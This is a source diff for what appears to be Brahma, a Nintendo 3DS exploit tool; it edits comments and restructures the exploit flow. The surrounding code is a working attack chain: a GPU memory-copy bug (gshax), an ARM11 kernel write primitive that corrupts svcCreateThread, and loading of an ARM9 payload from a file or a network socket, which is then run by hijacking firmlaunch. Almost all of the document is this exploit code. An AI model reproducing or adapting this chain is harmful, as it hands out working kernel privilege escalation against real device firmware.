@@ -36,7 +36,7 @@ void redirect_codeflow (u32 *dst_addr, u32 *src_addr) {
 
 /* exploits a bug that causes the GPU to copy memory
    that otherwise would be inaccessible to code from
-   non-privileged code */
+   a non-privileged context */
 void do_gshax_copy (void *dst, void *src, u32 len) {
 	u32 check_mem = linearMemAlign(0x10000, 0x40);
 	s32 i = 0;
@@ -54,7 +54,6 @@ void do_gshax_copy (void *dst, void *src, u32 len) {
 
 /* fills exploit_data structure with information that is specific
    to 3DS model and firmware version
-
    returns: 0 on failure, 1 on success */ 
 s32 get_exploit_data (struct exploit_data *data) {
 	u32 fversion = 0;    
@@ -70,9 +69,8 @@ s32 get_exploit_data (struct exploit_data *data) {
 	APT_CheckNew3DS(NULL, &isN3DS);
 	sysmodel = isN3DS ? SYS_MODEL_NEW_3DS : SYS_MODEL_OLD_3DS;
 
-	/* attempt to find out whether the exploit supports 'our'
-	   current 3DS model and FIRM version */
-	for(i=0; i < sizeof(supported_systems)/sizeof(supported_systems[0]); i++) {
+	/* copy platform and firmware dependent data */
+	for(i=0; i < sizeof(supported_systems) / sizeof(supported_systems[0]); i++) {
 		if (supported_systems[i].firm_version == fversion &&
 			supported_systems[i].sys_model & sysmodel) {
 				memcpy(data, &supported_systems[i], sizeof(struct exploit_data));
@@ -83,8 +81,8 @@ s32 get_exploit_data (struct exploit_data *data) {
 	return result;
 }
 
-/* exploits a bug which causes the ARM11 kernel
-   to write a certain value to 'address' */
+/* exploits a bug in order to cause the ARM11 kernel
+   to write a certain 32 bit value to 'address' */
 void priv_write_four (u32 address) {
 	const u32 size_heap_cblk = 8 * sizeof(u32);
 	u32 addr_lin, addr_lin_o;
@@ -141,32 +139,33 @@ void user_clear_icache (void) {
 	return;
 }
 
+/* get system dependent data and set up ARM11 structures */
+s32 setup_exploit_data (void) {
+	s32 result = 0;
+
+	if (get_exploit_data(&g_expdata)) {
+		/* copy data required by code running in ARM11 svc mode */	
+		g_arm11shared.va_hook1_ret = g_expdata.va_hook1_ret;
+		g_arm11shared.va_pdn_regs = g_expdata.va_pdn_regs;
+		g_arm11shared.va_pxi_regs = g_expdata.va_pxi_regs;
+		result = 1;
+	}
+	return result;
+}
+
 /* Corrupts ARM11 kernel code (CreateThread()) in order to
    open a door for code execution with ARM11 SVC privileges. */
 s32 corrupt_svcCreateThread (void) {
 	s32 result = 0;
 
-	// get system dependent data required for the exploit		
-	if (get_exploit_data(&g_expdata)) {
-		
-		/* prepare system-dependant data required by
-		the exploit's ARM11 kernel code */		
-		g_arm11shared.va_hook1_ret = g_expdata.va_hook1_ret;
-		g_arm11shared.va_pdn_regs = g_expdata.va_pdn_regs;
-		g_arm11shared.va_pxi_regs = g_expdata.va_pxi_regs;
-
-		// corrupt certain parts of the svcCreateThread() kernel code
-		priv_write_four(g_expdata.va_patch_createthread);
-
-		// clear icache from "userland"
-		user_clear_icache();
-		result = 1;		
-	}
+	priv_write_four(g_expdata.va_patch_createthread);
+	user_clear_icache();
+	result = 1;		
 
 	return result;
 }
 
-/* TODO: experimental, network code might be moved somewhere else */
+/* TODO: network code might be moved somewhere else */
 s32 recv_arm9_payload (void) {
 	s32 sockfd;
 	struct sockaddr_in sa;
@@ -256,19 +255,15 @@ s32 recv_arm9_payload (void) {
 	close(clientfd);
 	close(sockfd);
 
-	return 1;
+	return g_ext_arm9_loaded;
 }
 
 /* reads ARM9 payload from a given path.
-   filename - full path of payload
-   buf - ptr to a global buffer that will hold the entire payload
-   buf_size - size of the 'buf' variable
-   out_size - will contain the payload's actual size
-
+   filename: full path of payload
    returns: 0 on failure, 1 on success */
 s32 load_arm9_payload (char *filename) {
 	s32 result = 0;
-	s32 fsize = 0;
+	u32 fsize = 0;
 
 	if (!filename)
 		return result; 
@@ -279,7 +274,7 @@ s32 load_arm9_payload (char *filename) {
 		fsize = ftell(f);
 		g_ext_arm9_size = fsize;
 		rewind(f);
-		if (fsize >= 8 && (fsize < ARM9_PAYLOAD_MAX_SIZE)) {
+		if (fsize >= 8 && (fsize <= ARM9_PAYLOAD_MAX_SIZE)) {
 				u32 bytes_read = fread(g_ext_arm9_buf, 1, fsize, f);
 				result = (g_ext_arm9_loaded = (bytes_read == fsize));
 		}
@@ -288,21 +283,20 @@ s32 load_arm9_payload (char *filename) {
 	return result;
 }
 
-/* copies externally loaded ARM9 payload to FCRAM
-   - During execution of the ARM11 payload, its code writes
-     a copy of the mapped FIRM header's ARM9 entry point to
-     offset 4 of the ARM9 payload, so that custom ARM9 payload
-     may return execution to FIRM.
-     Thus, the ARM9 payload should consist of
+/* copies ARM9 payload to FCRAM
+   - before overwriting it in memory, Brahma creates a backup copy of
+     the mapped firm binary's ARM9 entry point. The copy will be stored
+     into offset 4 of the ARM9 payload during run-time.
+     This allows the ARM9 payload to resume booting the Nintendo firmware
+     code.
+     Thus, the format of ARM9 payload written for Brahma is the following:
      - a branch instruction at offset 0 and
      - a placeholder (u32) at offset 4 (=ARM9 entrypoint) */ 
 s32 map_arm9_payload (void) {
-	extern void *arm9_start;
-	extern void *arm9_end;
 	void *src;
 	volatile void *dst;
 
-	s32 size = 0;
+	u32 size = 0;
 	s32 result = 0;
 
 	dst = (void *)(g_expdata.va_fcram_base + OFFS_FCRAM_ARM9_PAYLOAD);
@@ -318,7 +312,6 @@ s32 map_arm9_payload (void) {
 		size = g_ext_arm9_size;
 	}
 
-	// TODO: properly sanitize 'size' (must not overflow fcram)
 	if (size >= 0 && size <= ARM9_PAYLOAD_MAX_SIZE) {
 		memcpy(dst, src, size);
 		result = 1;
@@ -328,11 +321,9 @@ s32 map_arm9_payload (void) {
 }
 
 s32 map_arm11_payload (void) {
-	extern void *arm11_start;
-	extern void *arm11_end;
 	void *src;
 	volatile void *dst;
-	s32 size = 0;
+	u32 size = 0;
 	u32 offs;
 	s32 result_a = 0;
 	s32 result_b = 0;
@@ -412,8 +403,8 @@ void repair_svcCreateThread (void) {
 	return;
 }
 
-/* restore svcCreateThread code (just to be safe),
-   prepare for and perform firm launch */
+/* restore svcCreateThread code (not really required,
+   but just to be on the safe side) */
 s32 __attribute__((naked))
 priv_firm_reboot (void) {
 	asm volatile ("add sp, sp, #8\t\n");
@@ -425,15 +416,19 @@ priv_firm_reboot (void) {
 			 "ldr pc, [sp], #4\t\n");
 }
 
+/* perform firmlaunch. load ARM9 payload before calling this
+   function. otherwise, calling this function simply reboots
+   the handheld */
 s32 firm_reboot (void) {
 	s32 fail_stage = 0;
-	/* 3DS and/or firmware not supported, ARM11 exploit failure */
-	fail_stage++;
 	
-	if (corrupt_svcCreateThread()) {
-		/* Firmlaunch failure, ARM9 exploit failure*/
-		fail_stage++;
-		svcCorruptedCreateThread(priv_firm_reboot);
+	fail_stage++; /* platform or firmware not supported, ARM11 exploit failure */
+	if (setup_exploit_data()) {
+		fail_stage++; /* failure while trying to corrupt svcCreateThread() */
+		if (corrupt_svcCreateThread()) {
+			fail_stage++; /* Firmlaunch failure, ARM9 exploit failure*/
+			svcCorruptedCreateThread(priv_firm_reboot);
+		}
 	}
 
 	/* we do not intend to return ... */
